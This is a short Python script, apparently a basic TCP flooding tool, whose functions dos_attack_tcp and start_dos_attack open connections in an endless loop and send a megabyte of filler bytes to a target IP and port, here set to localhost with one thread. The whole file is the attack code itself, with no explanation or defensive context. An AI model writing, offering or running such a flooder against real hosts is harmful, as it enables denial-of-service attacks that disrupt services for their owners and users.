import socket
import threading
import random


def dos_attack_tcp(target_ip, target_port):

    data = ("A" * 10**6).encode()

    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((target_ip, target_port))

            client_socket.sendall(data)
        except Exception as e:
            print(f"Error: {e}")
        finally:
            client_socket.close()

def start_dos_attack(target_ip, target_port):
    num_threads = 1
    for _ in range(num_threads):
        thread = threading.Thread(target=dos_attack_tcp, args=(target_ip, target_port))
        thread.start()

if __name__ == "__main__":
    target_ip = 'localhost'
    target_port = 12345
    start_dos_attack(target_ip, target_port)
